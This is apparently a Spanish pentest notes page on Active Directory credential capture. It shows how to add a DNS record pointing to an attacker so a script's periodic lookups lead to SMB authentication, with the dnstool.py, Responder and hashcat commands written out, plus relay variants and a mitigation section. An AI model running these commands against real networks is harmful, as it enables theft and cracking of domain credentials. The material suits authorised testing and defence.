---
topic: Registros DNS y captura de credenciales con Responder
tags: [windows, ad, dns, responder, ntlm]
---

# Registros DNS y captura de credenciales con Responder

[🌐 English](dns-responder-credential-capture.en.md) | **Español**

## Concepto

Un script o una aplicación que resuelve nombres con un prefijo predecible puede ser desviado si se crea un registro DNS que apunte al atacante. Cuando el cliente se autentica por SMB, Responder captura el hash Net-NTLMv2 para crackearlo o relayarlo.

## Cuándo aplica

- Se puede crear un registro DNS en la zona del dominio.
- Un script consulta nombres como `web*` de forma periódica.
- El host víctima resuelve y se autentica contra el atacante.

## Procedimiento

1. Identificar el patrón de nombres y la frecuencia.
2. Crear un registro A que apunte a la IP del atacante.
3. Iniciar Responder y esperar la autenticación.
4. Crackear el hash con `hashcat -m 5600` o relayarlo.

```bash
# Crear el registro con credenciales de un usuario que pueda escribir en la zona
python3 dnstool.py -u 'DOMAIN\user' -p '<PASSWORD>' -r web-x -a add -t A -d <ATTACKER> <DC>
responder -I eth0 -wv
hashcat -m 5600 hash.txt rockyou.txt
```

## Variantes

- Relay NTLM a LDAP o SMB con `ntlmrelayx`.
- Usar IPv6 y WPAD si la red lo permite.
- Combinar con un recurso SMB malicioso.

## Limitaciones

- Se necesita permiso para crear registros DNS.
- El tráfico SMB debe llegar al atacante.
- SMB signing puede impedir el relay.

## Mitigación y detección

- Restringir la creación de registros DNS y auditar cambios.
- Deshabilitar NTLM o exigir signing y channel binding.
- Revisar scripts que resuelvan nombres no confiables.

## Referencias

- <https://attack.mitre.org/techniques/T1557/001/>
- <https://github.com/lgandx/Responder>
- <https://learn.microsoft.com/en-us/windows-server/networking/dns/dns-top>
